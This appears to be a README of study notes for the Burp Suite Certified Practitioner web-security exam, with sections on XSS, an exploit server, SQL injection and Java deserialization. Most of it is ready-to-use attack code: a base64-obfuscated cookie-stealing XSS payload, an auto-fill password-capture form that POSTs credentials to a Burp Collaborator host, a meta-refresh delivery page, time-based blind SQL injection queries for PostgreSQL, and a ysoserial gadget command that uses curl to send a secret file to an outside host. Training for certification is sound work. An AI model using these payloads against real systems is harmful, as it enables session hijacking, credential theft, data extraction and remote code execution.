# <img src="https://icons.iconarchive.com/icons/goescat/macaron/1024/burp-suite-icon.png" width=25> BSCP Methodology

## Table of Contents
* [Useful Burp extensions](#useful-burp-extensions-some-of-them-requires-burpsuite-pro)
* [Cross-Site Scripting Section](#cross-site-scripting-section)
   * [Bypass restrictions method 1](#bypass-restrictions-method-1)
   * [Capture credentials from auto-filled forms](#capture-credentials-from-auto-filled-forms)
* [Exploit Server Section](#exploit-server-section)
  * [Send exploit to victim (Reflected XSS in search bar)](#send-exploit-to-victim-reflected-xss-in-search-bar)
* [SQL Injection Section](#sql-injection-section)
  * [PostgreSQL](#postgresql)
  * [MySQL](#mysql)
  * [Oracle](#oracle)
  * [SQLite](#sqlite)
* [Insecure Deserialization Section](#insecure-deserialization-section)
  * [Java](#java)
## Useful Burp extensions (some of them requires burpsuite pro)
- Hackvertor
- Copy As Python-Requests
- Java Deserialization Scanner | [ysoserial.jar](https://github.com/frohoff/ysoserial) for manual exploitation<b>(prefer because sometime this extension it doesn't work as it should)</b>
- HTTP Request Smuggler


## Cross-Site Scripting Section
You can find an injection point with some payloads from this repository - [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) <br>
Also here - [XSS Payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all)

### Bypass restrictions method 1
Sometimes we found a XSS injection point but with some keyword restrictions, so we have to bypass these restrictions with some techniques like below.
1. Generate the base64 payload

```bash
echo -n "document.location = 'http://<BURP-COLLABORATOR.NET>/?cookie='+document.cookie" |base64
```

2. Insert the base64 payload into atob function
```javascript
eval(atob("BASE64-PAYLOAD"))
<script>eval(atob("BASE64-PAYLOAD"))</script>
```

### Capture credentials from auto-filled forms
Sometimes we use password managers that fill in forms automatically and with this technique we can grab those credentials just making a small html form.
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://zy1cmwt0q8o3vtlolrhvx9nfn6t7hw.burpcollaborator.net',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

## Exploit Server Section
#### Send exploit to victim (Reflected XSS in search bar)
With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript injected search query.
```html
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?search=injection_here' />

<!-- ALL TOGETHER BELOW-->
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?SearchTerm=aa","fd8xsw5l":eval(atob("BASE64-PAYLOAD"))}//' />
```

## SQL Injection Section

### PostgreSQL
#### Time Based
Identify time based
```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

Database Dump Time Based<br>

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

Table Dump Time Based <br>

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

Columns Dump Time Based <br>
```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
```


### MySQL

### Oracle

### SQLite

## Insecure Deserialization Section


### Java
If you have `Java Deserialization Scanner` burp extension you can do an active scan(pro version only) and maybe you will find something ;) at least exploit it manually with the below tool.
#### ysoseriar.jar
payloads about `ysoseriar` <br>
<b>Dont forget</b> the below payloads requires url encoding after payload are generated
```bash
java -jar ysoseriar.jar CommonsCollections7 'curl -d @/home/carlos/secret k3of2usea0s8kzkwsqnme9bj2a83ws.burpcollaborator.net' | gzip|base64 

java -jar ysoseriar.jar <PAYLOAD> 'COMMAND' | encoding
```
For more information about payloads and stuff you can find in the ysoserial [official repository](https://github.com/frohoff/ysoserial)
